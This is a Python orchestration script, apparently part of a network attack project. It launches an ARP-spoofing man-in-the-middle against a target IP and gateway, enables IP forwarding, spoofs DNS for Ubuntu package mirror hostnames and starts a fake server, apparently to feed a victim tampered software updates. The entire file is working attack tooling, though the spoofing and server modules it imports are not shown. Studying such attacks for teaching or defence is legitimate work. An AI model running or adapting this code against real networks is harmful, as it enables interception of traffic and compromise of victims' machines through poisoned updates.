#!/usr/bin/env python3.6

import os
import argparse
from arp import arp_spoof
from dns import dns_spoof
from mirrors import get_list_of_mirrors
from fake_server import start_server
from scapy.all import get_if_hwaddr, getmacbyip
import _thread as thread

# python attack_executable.py -t Target_IP -g Gateway_IP -i Interface
if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument("-t", "--target", help="Target_IP")
    parser.add_argument("-g", "--gateway", help="Gateway_IP")
    parser.add_argument("-i", "--interface", help="Interface")

    args = parser.parse_args()

    if not (args.target and args.gateway and args.interface):
        print("Wrong/insufficient input parameters to the command")
        print(parser.format_help())
    else:
        iface = args.interface
        ip_victim = args.target
        ip_to_spoof = args.gateway
        mac_attacker = get_if_hwaddr(iface)
        mac_victim = getmacbyip(ip_victim)

        ip_forward_path = "/proc/sys/net/ipv4/ip_forward"

        # Read value from ip_forward_path
        ip_forward_original_status = os.popen("cat {}".format(ip_forward_path)).read()
        if "0" in ip_forward_original_status:
            print("Enabling ip forwarding")
            os.system("echo 1 > {}".format(ip_forward_path))

        # get list of Ubuntu mirrors
        mirror_list = get_list_of_mirrors()

        # Create three threads as follows
        try:
            arp_args = (mac_attacker, mac_victim, ip_to_spoof, ip_victim, iface,)

            t1 = thread.start_new_thread(arp_spoof, arp_args)
            t2 = thread.start_new_thread(dns_spoof, (iface, mirror_list))
            t3 = thread.start_new_thread(start_server, (iface,))

            print("Started threads")
        except Exception:
            print("Error: unable to start thread")
            import traceback
            print(traceback.format_exc())

        try:
            # We need to keep this function alive to keep the threads running
            while True:
                pass
        except KeyboardInterrupt:
            print("\nReceived KeyboardInterrupt: stopping threads")

            if "0" in ip_forward_original_status:
                print("Disabling ip forwarding")
                os.system("echo 0 > {}".format(ip_forward_path))
